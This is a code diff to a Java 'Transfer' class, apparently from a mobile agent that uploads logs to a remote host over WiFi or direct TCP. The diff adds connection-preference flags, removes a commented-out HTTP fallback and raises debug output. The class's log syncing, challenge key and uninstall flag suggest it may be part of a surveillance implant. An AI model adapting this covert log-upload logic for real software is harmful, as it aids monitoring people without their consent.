@@ -35,7 +35,7 @@ public class Transfer {
 
     /** The debug instance. */
     //#ifdef DEBUG
-    protected static Debug debug = new Debug("Transfer", DebugLevel.NOTIFY);
+    protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);
     //#endif
 
     /** The Constant instance_. */
@@ -58,8 +58,9 @@ public class Transfer {
     private int port = 0;
     private boolean ssl;
 
-    private boolean wifiPreferred;
-    //private boolean wifi = false;
+    private boolean wifiForced;
+    private boolean gprsAdmitted;
+    private boolean wifiAdmitted;
 
     private boolean connected = false;
 
@@ -102,8 +103,11 @@ public class Transfer {
             return true;
         }
 
-        //wifi = false;
-        if (wifiPreferred) {
+        if (wifiForced) {
+            //TODO: forza up di wifi
+        }
+
+        if (wifiAdmitted) {
             //#ifdef DEBUG_TRACE
             debug.trace("Try wifi, ssl:" + ssl);
             //#endif
@@ -123,30 +127,9 @@ public class Transfer {
                 //#endif
             }
         }
-        
-        /* ifdef HTTP_CONNECTION
-        if (!connected) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("Try http, ssl:" + ssl);
-            //#endif
-            for (int method = 0; method <= CHttpConnection.METHOD_LAST; method++) {
-                //#ifdef DEBUG_TRACE
-                debug.trace("method: " + method);
-                //#endif
-                connection = new CHttpConnection(host, port, ssl, method);
-                connected = connection.connect();
-                if (connected) {
-                    //#ifdef DEBUG_INFO
-                    debug.info("Connected http ssl:" + ssl + " method: " + method);
-                    //#endif
-                    break;
-                }
-            }         
-        }
-        */
 
         // fall back
-        if ( !connected) {
+        if (!connected && gprsAdmitted) {
             //#ifdef DEBUG_TRACE
             debug.trace("Try direct tcp, ssl:" + ssl);
             //#endif
@@ -158,12 +141,13 @@ public class Transfer {
                 connected = connection.connect();
                 if (connected) {
                     //#ifdef DEBUG_INFO
-                    debug.info("Connected tpc ssl:" + ssl + " method: " + method);
+                    debug.info("Connected tpc ssl:" + ssl + " method: "
+                            + method);
                     //#endif
                     break;
                 }
-            }            
-        }           
+            }
+        }
 
         if (connection == null) {
             //#ifdef DEBUG
@@ -464,9 +448,11 @@ public class Transfer {
      *            the ssl_
      * @param wifiPreferred_
      *            the wifi preferred_
+     * @param gprs
      */
     public final void init(final String host_, final int port_,
-            final boolean ssl_, final boolean wifiPreferred_) {
+            final boolean ssl_, final boolean wifiForced, final boolean wifi,
+            final boolean gprs) {
 
         reload = false;
         uninstall = false;
@@ -474,7 +460,9 @@ public class Transfer {
         host = host_;
         port = port_;
         ssl = ssl_;
-        wifiPreferred = wifiPreferred_;
+        this.wifiForced = wifiForced;
+        wifiAdmitted = wifi;
+        gprsAdmitted = gprs;
         crypto.makeKey(Keys.getInstance().getChallengeKey());
     }
 
@@ -868,6 +856,9 @@ public class Transfer {
      * @return true, if successful
      */
     public final synchronized boolean startSession() {
+        //#ifdef DEBUG_TRACE
+        debug.trace("startSession");
+        //#endif
         try {
             if (!connectDirect() && !connectMDS()) {
                 //#ifdef DEBUG
@@ -950,7 +941,7 @@ public class Transfer {
             throws ProtocolException {
 
         //#ifdef DEBUG_INFO
-        debug.info("syncLogs connected: " + connected );
+        debug.info("syncLogs connected: " + connected);
 
         //#endif
 
@@ -961,7 +952,7 @@ public class Transfer {
         debug.trace("syncLogs: all logs sent");
 
         //#endif
-        
+
         sendCommand(Proto.LOG_END);
         waitForOK();
     }
